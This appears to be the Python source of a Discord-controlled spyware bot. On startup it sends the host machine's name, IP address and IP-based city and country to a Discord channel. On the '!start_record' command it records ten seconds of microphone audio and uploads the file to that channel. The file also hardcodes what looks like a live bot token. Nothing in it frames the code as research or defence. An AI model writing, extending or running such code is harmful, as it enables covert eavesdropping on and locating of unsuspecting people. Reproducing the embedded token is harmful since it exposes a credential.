import discord
from discord.ext import commands, tasks
import pyaudio
import wave
import os
import socket
import requests
import geocoder
import time
import threading

# Initialize the bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Define the directory for storing audio recordings
RECORDINGS_DIR = "recordings"
if not os.path.exists(RECORDINGS_DIR):
    os.makedirs(RECORDINGS_DIR)

# Function to get system information
def get_system_info():
    system_name = socket.gethostname()
    system_ip = socket.gethostbyname(system_name)
    
    # Get geolocation based on the IP
    g = geocoder.ip(system_ip)
    geolocation = g.json

    return system_name, system_ip, geolocation

# Send system info to the server
def send_system_info_to_server():
    system_name, system_ip, geolocation = get_system_info()
    message = f"PC Name: {system_name}\nIP Address: {system_ip}\nLocation: {geolocation.get('city', 'Unknown')}, {geolocation.get('country', 'Unknown')}"
    
    # Send this info to a server (or a Discord channel, for example)
    channel = bot.get_channel(YOUR_CHANNEL_ID_HERE)  # Replace with your actual channel ID
    if channel:
        bot.loop.create_task(channel.send(message))

# Command to start recording
@bot.command()
async def start_record(ctx):
    await ctx.send("Starting recording for 10 seconds...")

    # Create a new thread to handle the recording
    thread = threading.Thread(target=record_audio)
    thread.start()

    # Wait for the recording to finish and send it back to the server
    time.sleep(10)
    await ctx.send(file=discord.File("recordings/recording.wav"))

# Function to record audio for 10 seconds and save to file
def record_audio():
    p = pyaudio.PyAudio()

    # Set up audio parameters
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 1024
    RECORD_SECONDS = 10
    WAVE_OUTPUT_FILENAME = os.path.join(RECORDINGS_DIR, "recording.wav")

    # Open stream and record audio
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)

    frames = []
    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    # Save the recorded audio to a file
    with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

# Event that runs when the bot is ready
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    send_system_info_to_server()  # Send system info to the server on bot start

# Run the bot
bot.run("MTI3NTQ3NjIwMjgwNjU3NTIzNw.GMSKsE.PLdRXSTVISc8Ttp80UPayMMcD0fjank9Kqc2jU")  # Replace with your bot's token
